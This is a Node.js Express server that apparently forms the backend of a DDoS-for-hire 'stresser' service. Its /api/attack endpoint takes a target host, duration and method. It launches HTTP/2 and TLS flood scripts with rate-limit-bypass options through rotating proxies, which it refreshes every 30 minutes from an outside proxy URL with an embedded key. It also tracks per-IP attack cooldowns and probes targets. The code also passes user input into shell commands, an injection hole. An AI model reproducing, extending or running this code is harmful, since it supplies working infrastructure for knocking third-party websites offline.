const express = require('express');
const { exec } = require('child_process');
const validator = require('validator');
const axios = require('axios');
const fs = require('fs').promises;
const https = require('https');
const app = express();
const port = 2025;

// Cooldown tracking
const activeAttacks = new Map(); // Store ongoing attacks

// Allowed methods
const ALLOWED_METHODS = ['dstat', 'h2-storm', 'h2-bypass', 'h2-tls', 'priv-h2'];

// Proxy update configuration
const PROXY_API_URL = 'http://vip.qiucg.com/proxy.txt?key=7EO5IZ8O';
const PROXY_FILE = 'o.txt';
const UPDATE_INTERVAL = 30 * 60 * 1000; // 30 minutes

// Middleware to parse JSON and URL-encoded bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Function to update proxy list
async function updateProxyList() {
    try {
        console.log('Fetching new proxy list...');
        const response = await axios.get(PROXY_API_URL);
        if (response.status !== 200) {
            throw new Error(`Failed to fetch proxies: HTTP ${response.status}`);
        }

        const proxies = response.data;
        if (!proxies || typeof proxies !== 'string') {
            throw new Error('Invalid proxy data received');
        }

        await fs.writeFile(PROXY_FILE, proxies, 'utf8');
        console.log('Proxy list updated successfully');
    } catch (error) {
        console.error('Failed to update proxy list:', error.message);
    }
}

// Initialize proxy update
updateProxyList().then(() => {
    setInterval(updateProxyList, UPDATE_INTERVAL);
});

// Input validation middleware
const validateInput = (req, res, next) => {
    const { host, port, time, method } = req.query;

    if (!host || !validator.isURL(host)) {
        return res.status(400).json({ error: 'Invalid or missing host URL' });
    }

    if (!port || !validator.isPort(port) || parseInt(port) !== 443) {
        return res.status(400).json({ error: 'Invalid port, only 443 is allowed' });
    }

    const timeNum = parseInt(time);
    if (!time || isNaN(timeNum) || timeNum <= 0 || timeNum > 300) {
        return res.status(400).json({ error: 'Time must be a number between 1 and 300 seconds' });
    }

    if (!method || !ALLOWED_METHODS.includes(method.toLowerCase())) {
        return res.status(400).json({ error: `Invalid method, allowed methods: ${ALLOWED_METHODS.join(', ')}` });
    }

    req.validatedParams = { host, port, time: timeNum, method: method.toLowerCase() };
    next();
};

// Cooldown middleware
const checkCooldown = (req, res, next) => {
    const userIp = req.ip;
    const attackInfo = activeAttacks.get(userIp);

    if (attackInfo) {
        const timeSinceAttack = Date.now() - attackInfo.startTime;
        const remainingCooldown = attackInfo.time * 1000 - timeSinceAttack;

        if (remainingCooldown > 0) {
            return res.status(429).json({
                error: `Please wait ${Math.ceil(remainingCooldown / 1000)} seconds before starting another attack`
            });
        }
    }

    next();
};

// Main attack route
app.get('/api/attack', validateInput, checkCooldown, (req, res) => {
    const { host, port, time, method } = req.validatedParams;
    const userIp = req.ip;

    let command;
    switch (method) {
        case 'dstat':
            command = `node zvip.js "${host}" ${port} ${time} "16" "4" "${PROXY_FILE}"`;
            break;
        case 'h2-storm':
            command = `node httpddos.js "${host}" ${time} "16" "2" "${PROXY_FILE}"`;
            break;
        case 'h2-bypass':
            command = `node jsbypass.js GET "${host}" ${time} "4" "32" "proxies.txt" --full --connect --ratelimit-bypass --auth`;
            break;
        case 'h2-tls':
            command = `node new.js "${host}" ${time} "32" "2" "${PROXY_FILE}" flood`;
            break;
        case 'priv-h2':
            command = `node browser.js "${host}" ${time} "4" "16" "vn.txt" --threads 1 --flooder true --auth true --cookies 10`;
            break;
        default:
            return res.status(400).json({ error: 'Unsupported method' });
    }

    activeAttacks.set(userIp, { startTime: Date.now(), time });

    exec(command, (error, stdout, stderr) => {
        setTimeout(() => {
            activeAttacks.delete(userIp);
        }, time * 1000);

        if (error) {
            activeAttacks.delete(userIp);
            return res.status(500).json({
                error: 'Attack failed to execute',
                details: stderr || error.message
            });
        }

        res.json({
            message: 'Attack started successfully',
            details: {
                host,
                port,
                time,
                method,
                output: stdout
            }
        });
    });
});

// Method: /api/status
app.get('/api/status', (req, res) => {
    const userIp = req.ip;
    const attackInfo = activeAttacks.get(userIp);

    if (!attackInfo) {
        return res.json({ active: false, message: 'No active attack for this IP' });
    }

    const timeLeft = Math.max(0, (attackInfo.time * 1000 - (Date.now() - attackInfo.startTime)) / 1000);

    res.json({
        active: true,
        timeRemaining: Math.ceil(timeLeft),
        startedAt: new Date(attackInfo.startTime).toISOString()
    });
});

// Method: /api/ping
app.get('/api/ping', async (req, res) => {
    const { host } = req.query;

    if (!host || !validator.isURL(host)) {
        return res.status(400).json({ error: 'Invalid or missing host' });
    }

    try {
        const response = await axios.get(host, { timeout: 5000 });
        res.json({
            message: 'Host responded successfully',
            statusCode: response.status
        });
    } catch (error) {
        res.status(502).json({
            error: 'Host is not responding',
            details: error.message
        });
    }
});

// Method: /api/tls – TLS certificate check
function tlsCheck(host) {
    return new Promise((resolve, reject) => {
        const req = https.get(host, (res) => {
            const cert = res.socket.getPeerCertificate();
            resolve({
                valid: res.socket.authorized || false,
                certificate: cert,
                protocol: res.socket.getProtocol()
            });
        });
        req.on('error', reject);
        req.end();
    });
}

app.get('/api/tls', async (req, res) => {
    const { host } = req.query;

    if (!host || !validator.isURL(host)) {
        return res.status(400).json({ error: 'Invalid host' });
    }

    try {
        const result = await tlsCheck(host);
        res.json(result);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Method: /api/browser – Simulate browser request
app.get('/api/browser', async (req, res) => {
    const { host } = req.query;

    if (!host || !validator.isURL(host)) {
        return res.status(400).json({ error: 'Invalid host' });
    }

    try {
        const start = Date.now();

        const response = await axios.get(host, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123 Safari/537.36"
            }
        });

        const duration = Date.now() - start;

        res.json({
            statusCode: response.status,
            responseTimeMs: duration,
            contentType: response.headers['content-type']
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Something went wrong!' });
});

// Start server
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});

// Cleanup finished attacks
setInterval(() => {
    const now = Date.now();
    for (const [ip, attack] of activeAttacks) {
        if (now - attack.startTime >= attack.time * 1000) {
            activeAttacks.delete(ip);
        }
    }
}, 60000);
